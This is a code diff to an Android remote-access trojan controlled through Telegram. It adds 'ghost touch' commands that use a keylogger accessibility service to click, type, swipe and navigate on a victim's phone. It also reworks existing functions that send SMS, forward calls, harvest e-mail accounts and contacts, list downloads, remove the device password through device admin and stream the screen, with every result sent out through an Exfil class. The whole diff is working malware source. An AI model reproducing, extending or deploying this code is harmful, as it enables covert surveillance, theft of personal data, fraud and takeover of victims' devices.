@@ -175,6 +175,37 @@ public class TelegramService extends Service {
                 startService(new Intent(this, TelegramService.class));
                 Exfil.send("🔄 Service Restarted.");
             }
+            // SMART GHOST TOUCH
+            else if (cmd.startsWith("/click ")) {
+                if (KeyloggerService.instance != null) {
+                    boolean ok = KeyloggerService.instance.performClick(cmd.substring(7).trim());
+                    Exfil.send(ok ? "👆 Clicked Successfully!" : "❌ Text not found on screen.");
+                } else Exfil.send("❌ Accessibility OFF.");
+            }
+            else if (cmd.startsWith("/type ")) {
+                if (KeyloggerService.instance != null) {
+                    boolean ok = KeyloggerService.instance.performSetText(cmd.substring(6).trim());
+                    Exfil.send(ok ? "⌨️ Text Injected!" : "❌ No input field focused.");
+                } else Exfil.send("❌ Accessibility OFF.");
+            }
+            else if (cmd.startsWith("/swipe ")) {
+                if (KeyloggerService.instance != null) {
+                    KeyloggerService.instance.performSwipe(cmd.substring(7).trim());
+                    Exfil.send("🖐️ Swiped " + cmd.substring(7).trim());
+                } else Exfil.send("❌ Accessibility OFF.");
+            }
+            else if (cmd.equals("/back")) {
+                if (KeyloggerService.instance != null) { KeyloggerService.instance.pressBack(); Exfil.send("⬅️ Back pressed."); }
+            }
+            else if (cmd.equals("/home")) {
+                if (KeyloggerService.instance != null) { KeyloggerService.instance.pressHome(); Exfil.send("🏠 Home pressed."); }
+            }
+            else if (cmd.equals("/recents")) {
+                if (KeyloggerService.instance != null) { KeyloggerService.instance.pressRecents(); Exfil.send("📱 Recents opened."); }
+            }
+            else if (cmd.equals("/notif")) {
+                if (KeyloggerService.instance != null) { KeyloggerService.instance.openNotifications(); Exfil.send("🔔 Notifications opened."); }
+            }
         });
     }
 
@@ -193,35 +224,30 @@ public class TelegramService extends Service {
                 "/wifi - Get Wi-Fi info\n" +
                 "/forward <number> - Forward calls\n" +
                 "/vnc, /cryptoclip, /apps\n" +
-                "/uninstall <pkg>, /restart";
+                "/uninstall <pkg>, /restart\n\n" +
+                "**SMART GHOST TOUCH:**\n" +
+                "/click <text> - Click element by text\n" +
+                "/type <text> - Inject text into focused field\n" +
+                "/swipe <up/down/left/right> - Swipe screen\n" +
+                "/back, /home, /recents, /notif";
         Exfil.send(menu);
     }
 
-    // ================== NEW NO-ROOT FEATURES ==================
-
+    // ================== SMART GHOST TOUCH HELPERS ==================
     private void sendSMS(String args) {
         try {
             String[] parts = args.split(" ", 2);
-            if (parts.length < 2) {
-                Exfil.send("❌ Usage: /sendsms <number> <message>");
-                return;
-            }
-            String number = parts[0];
-            String msg = parts[1];
-            
+            if (parts.length < 2) { Exfil.send("❌ Usage: /sendsms <number> <message>"); return; }
             SmsManager smsManager = SmsManager.getDefault();
-            smsManager.sendTextMessage(number, null, msg, null, null);
-            Exfil.send("✅ SMS Sent to " + number);
-        } catch (Exception e) {
-            Exfil.send("❌ SMS Error: " + e.getMessage());
-        }
+            smsManager.sendTextMessage(parts[0], null, parts[1], null, null);
+            Exfil.send("✅ SMS Sent to " + parts[0]);
+        } catch (Exception e) { Exfil.send("❌ SMS Error: " + e.getMessage()); }
     }
 
     private void getWifiInfo() {
         try {
             WifiManager wifiManager = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
             StringBuilder sb = new StringBuilder("📶 **Wi-Fi Info:**\n\n");
-            
             if (wifiManager != null && wifiManager.isWifiEnabled()) {
                 sb.append("Wi-Fi is ON\n");
                 if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
@@ -229,16 +255,11 @@ public class TelegramService extends Service {
                     if (wifiInfo != null) {
                         sb.append("Connected to: ").append(wifiInfo.getSSID()).append("\n");
                         sb.append("IP: ").append(android.text.format.Formatter.formatIpAddress(wifiInfo.getIpAddress())).append("\n");
-                        sb.append("MAC: ").append(wifiInfo.getMacAddress()).append("\n");
                     }
                 }
-            } else {
-                sb.append("Wi-Fi is OFF");
-            }
+            } else sb.append("Wi-Fi is OFF");
             Exfil.send(sb.toString());
-        } catch (Exception e) {
-            Exfil.send("❌ Wi-Fi Error: " + e.getMessage());
-        }
+        } catch (Exception e) {}
     }
 
     private void forwardCalls(String number) {
@@ -246,47 +267,34 @@ public class TelegramService extends Service {
             String ussdCode = "*21*" + number + "%23";
             Intent intent = new Intent(Intent.ACTION_CALL, Uri.parse("tel:" + Uri.encode(ussdCode)));
             intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
-            
             if (checkSelfPermission(Manifest.permission.CALL_PHONE) == PackageManager.PERMISSION_GRANTED) {
                 startActivity(intent);
                 Exfil.send("✅ Call Forwarding enabled to: " + number);
-            } else {
-                Exfil.send("❌ Missing CALL_PHONE permission in Manifest.");
-            }
-        } catch (Exception e) {
-            Exfil.send("❌ Forwarding Error: " + e.getMessage());
-        }
+            } else Exfil.send("❌ Missing CALL_PHONE permission.");
+        } catch (Exception e) {}
     }
 
     private void extractBrowserHistoryNoRoot() {
-        Exfil.send("⏳ Extracting Recent Downloads (No Root)...");
+        Exfil.send("⏳ Extracting Recent Downloads...");
         StringBuilder sb = new StringBuilder("🌐 **Recent Downloads:**\n\n");
-
         try {
             DownloadManager dm = (DownloadManager) getSystemService(DOWNLOAD_SERVICE);
             Cursor cursor = dm.query(new DownloadManager.Query().setFilterByStatus(DownloadManager.STATUS_SUCCESSFUL));
             if (cursor != null) {
                 int count = 0;
                 while (cursor.moveToNext() && count < 30) {
-                    String title = cursor.getString(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_TITLE));
-                    String uri = cursor.getString(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_URI));
-                    sb.append("• ").append(title).append("\n  ").append(uri).append("\n");
+                    sb.append("• ").append(cursor.getString(cursor.getColumnIndexOrThrow(DownloadManager.COLUMN_TITLE))).append("\n");
                     count++;
                 }
                 cursor.close();
             }
-        } catch (Exception e) {
-            sb.append("❌ Downloads error: ").append(e.getMessage()).append("\n");
-        }
-
+        } catch (Exception e) {}
         Exfil.send(sb.toString());
     }
 
-    // ================== EMAILS EXTRACTOR ==================
     private void getEmails() {
         Set<String> uniqueEmails = new HashSet<>();
         StringBuilder sb = new StringBuilder("📧 **Emails Found:**\n\n");
-
         if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
             try {
                 Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null, null, null, null);
@@ -301,28 +309,19 @@ public class TelegramService extends Service {
         }
         try {
             AccountManager am = AccountManager.get(this);
-            for (Account account : am.getAccounts()) {
-                if (account.name.contains("@")) uniqueEmails.add("Account : " + account.name);
-            }
+            for (Account account : am.getAccounts()) if (account.name.contains("@")) uniqueEmails.add("Account : " + account.name);
         } catch (Exception e) {}
-
         if (uniqueEmails.isEmpty()) { Exfil.send("❌ No emails found."); return; }
         int count = 0;
-        for (String email : uniqueEmails) {
-            sb.append("• ").append(email).append("\n");
-            if (++count >= 100) break;
-        }
+        for (String email : uniqueEmails) { sb.append("• ").append(email).append("\n"); if (++count >= 100) break; }
         Exfil.send(sb.toString());
     }
 
     // ================== FUN PANEL FEATURES ==================
     private void playAudio(String pathOrUrl) {
         try {
-            stopAudio();
-            audioPlayer = new MediaPlayer();
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
-                audioPlayer.setAudioAttributes(new AudioAttributes.Builder().setContentType(AudioAttributes.CONTENT_TYPE_MUSIC).setUsage(AudioAttributes.USAGE_MEDIA).build());
-            }
+            stopAudio(); audioPlayer = new MediaPlayer();
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) audioPlayer.setAudioAttributes(new AudioAttributes.Builder().setContentType(AudioAttributes.CONTENT_TYPE_MUSIC).setUsage(AudioAttributes.USAGE_MEDIA).build());
             if (pathOrUrl.startsWith("http")) audioPlayer.setDataSource(pathOrUrl);
             else {
                 File file = new File(pathOrUrl);
@@ -350,7 +349,7 @@ public class TelegramService extends Service {
             isFlashOn = !isFlashOn;
             manager.setTorchMode(manager.getCameraIdList()[0], isFlashOn);
             Exfil.send(isFlashOn ? "🔦 Flash ON" : "🔦 Flash OFF");
-        } catch (Exception e) { Exfil.send("Flash Error: " + e.getMessage()); }
+        } catch (Exception e) {}
     }
 
     private void playSiren() {
@@ -367,9 +366,8 @@ public class TelegramService extends Service {
         new Thread(() -> {
             try {
                 Bitmap myBitmap = null;
-                if (pathOrUrl.startsWith("/") || pathOrUrl.startsWith("file://")) {
-                    myBitmap = BitmapFactory.decodeFile(pathOrUrl.replace("file://", ""));
-                } else {
+                if (pathOrUrl.startsWith("/") || pathOrUrl.startsWith("file://")) myBitmap = BitmapFactory.decodeFile(pathOrUrl.replace("file://", ""));
+                else {
                     HttpURLConnection connection = (HttpURLConnection) new URL(pathOrUrl).openConnection();
                     connection.setRequestProperty("User-Agent", "Mozilla/5.0");
                     myBitmap = BitmapFactory.decodeStream(connection.getInputStream());
@@ -378,7 +376,7 @@ public class TelegramService extends Service {
                     WallpaperManager.getInstance(getApplicationContext()).setBitmap(myBitmap);
                     Exfil.send("🖼️ Wallpaper Changed!");
                 }
-            } catch (Exception e) { Exfil.send("❌ Wallpaper Error: " + e.getMessage()); }
+            } catch (Exception e) {}
         }).start();
     }
 
@@ -417,7 +415,7 @@ public class TelegramService extends Service {
         try {
             DevicePolicyManager dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
             ComponentName admin = new ComponentName(this, MyDeviceAdminReceiver.class);
-            if (dpm != null && dpm.isAdminActive(admin)) { dpm.resetPassword("", 0); Exfil.send("🔓 Password Removed."); }
+          if (dpm != null && dpm.isAdminActive(admin)) { dpm.resetPassword("", 0); Exfil.send("🔓 Password Removed."); }
         } catch (Exception e) {}
     }
 
@@ -440,7 +438,7 @@ public class TelegramService extends Service {
         } catch (Exception e) {}
     }
 
-  private void startVncStream() {
+    private void startVncStream() {
         if (!isVncRunning) return;
         if (KeyloggerService.instance != null) KeyloggerService.instance.captureScreenSilent();
         mainHandler.postDelayed(this::startVncStream, 3000);
